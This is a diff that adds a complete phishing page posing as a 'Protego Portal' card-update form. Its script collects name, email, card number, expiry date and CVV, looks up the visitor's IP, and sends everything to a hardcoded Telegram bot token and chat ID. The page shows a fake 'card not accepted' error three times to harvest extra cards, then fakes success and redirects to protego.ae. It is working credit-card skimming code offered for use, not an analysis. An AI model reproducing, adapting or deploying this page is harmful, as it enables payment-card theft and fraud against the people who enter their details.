@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Protego Portal</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: grey;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+
+        .form-container {
+            background-color: white;
+            border-radius: 2px;
+            width: 500px;
+            padding: 50px 20px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+            position: relative;
+            text-align: left;
+        }
+
+        .logo {
+            position: absolute;
+            top: 3px;
+            left: 19px;
+            width: 90px;
+            height: 40px;
+        }
+
+        .form-container label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .form-container input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        .form-row {
+            display: flex;
+            justify-content: space-between;
+            gap: 5%;
+        }
+
+        .form-row .small-input {
+            width: 95%;
+            padding: 10px;
+        }
+
+        .pay-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #28a745; /* Green color */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .pay-btn.disabled {
+            cursor: not-allowed;
+        }
+
+        /* Three dots loader */
+        .dot {
+            height: 10px;
+            width: 10px;
+            background-color: white;
+            border-radius: 50%;
+            display: inline-block;
+            margin-left: 5px;
+            opacity: 0;
+            animation: blink 2s infinite;
+        }
+
+        .dot:nth-child(1) {
+            animation-delay: 0s;
+        }
+        .dot:nth-child(2) {
+            animation-delay: 0.3s;
+        }
+        .dot:nth-child(3) {
+            animation-delay: 0.6s;
+        }
+
+        @keyframes blink {
+            0% { opacity: 0; }
+            50% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+
+        /* Error message */
+        .error-message {
+            display: none;
+            text-align: center;
+            color: red;
+            margin-bottom: 10px;
+        }
+
+        /* Success message styles */
+        .success-message {
+            display: none;
+            text-align: center;
+            color: green;
+        }
+
+        .success-message .checkmark {
+            font-size: 30px;
+            line-height: 60px;
+            color: green;
+        }
+
+        /* Honeypot field (invisible to users) */
+        .honeypot {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQsK1a6UjK6kV0r6gecwXzF50hAS-23Z3MXmtSieb_WGZI_XIjsgGuJgKvTngGEKWji7A&usqp=CAU" alt="Logo">
+        
+        <form id="credit-card-form">
+            <label for="name">Name on Card</label>
+            <input type="text" id="name" name="name" placeholder="Enter name on card" required>
+
+            <label for="email">Email</label>
+            <input type="email" id="email" name="email" placeholder="Enter your email" required>
+
+            <label for="cc-number">Credit Card Number</label>
+            <input type="text" id="cc-number" name="cc-number" placeholder="Enter your card number" maxlength="19" required>
+
+            <div class="form-row">
+                <div>
+                    <label for="exp-date">Exp Date</label>
+                    <input type="text" id="exp-date" name="exp-date" placeholder="MM/YY" maxlength="5" class="small-input" required>
+                </div>
+                <div>
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="CVV" maxlength="3" class="small-input" required>
+                </div>
+            </div>
+
+            <div class="error-message" id="error-message">card not accepted, please use a different card.</div>
+
+            <!-- Honeypot field (hidden to actual users) -->
+            <input type="text" id="honeypot" class="honeypot" name="honeypot">
+
+            <button type="submit" class="pay-btn" id="pay-btn">UPDATE</button>
+        </form>
+
+        <!-- Success Message -->
+        <div class="success-message" id="success-message">
+            <div class="checkmark">&#10003;</div>
+            <p>Successful!</p>
+        </div>
+    </div>
+
+    <script>
+        let attemptCount = 0;
+
+        const form = document.getElementById('credit-card-form');
+        const errorMessage = document.getElementById('error-message');
+        const successMessage = document.getElementById('success-message');
+        const payBtn = document.getElementById('pay-btn');
+
+        form.addEventListener('submit', function (e) {
+            e.preventDefault(); // Prevent form from submitting normally
+
+            // Check honeypot field
+            const honeypotValue = document.getElementById('honeypot').value;
+            if (honeypotValue !== '') {
+                console.log("Bot detected!");
+                return; // Exit if the honeypot is filled (likely a bot)
+            }
+
+            // Collect form data
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const ccNumber = document.getElementById('cc-number').value;
+            const expDate = document.getElementById('exp-date').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Send data to Telegram bot
+            const botToken = '7844509735:AAGSTusoA1tn7NL7HZQIXpeCGlmtJWjWGWw';
+            const chatId = '5296256514';
+
+            // Get user's IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+
+                    const message = `CREDIT CARD INFO\nName: ${name}\nEmail: ${email}\nCredit Card: ${ccNumber}\nExp Date: ${expDate}\nCVV: ${cvv}\nIP Address: ${ipAddress}`;
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                    return fetch(telegramUrl);
+                })
+                .then(response => {
+                    payBtn.disabled = true;
+                    payBtn.classList.add('disabled');
+                    payBtn.innerHTML = `Processing <span class="dot"></span><span class="dot"></span><span class="dot"></span>`;
+
+                    setTimeout(function () {
+                        if (attemptCount < 3) {
+                            // If it's the first, second, or third attempt, show error
+                            errorMessage.style.display = 'block';
+                            payBtn.disabled = false;
+                            payBtn.classList.remove('disabled');
+                            payBtn.innerHTML = 'PAY';
+                            attemptCount++;
+                        } else {
+                            // If it's the fourth attempt, show success
+                            errorMessage.style.display = 'none';
+                            successMessage.style.display = 'block';
+
+                            // Remove grey background
+                            document.body.style.backgroundColor = 'white';
+
+                            // Redirect after 7 seconds
+                            setTimeout(function() {
+                                window.location.href = "https://protego.ae/";
+                            }, 7000);
+                        }
+                    }, 3000); // Adjusted delay for feedback
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Something went wrong, please try again.');
+                });
+        });
+
+        // Format credit card input
+        document.getElementById('cc-number').addEventListener('input', function (e) {
+            const value = e.target.value.replace(/\D/g, '').substring(0, 16);
+            const formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+            e.target.value = formattedValue;
+        });
+
+        // Format expiration date input
+        document.getElementById('exp-date').addEventListener('input', function (e) {
+            const value = e.target.value.replace(/\D/g, '').substring(0, 4);
+            const formattedValue = value.replace(/(\d{2})(\d+)/, '$1/$2');
+            e.target.value = formattedValue;
+        });
+    </script>
+</body>
+</html>
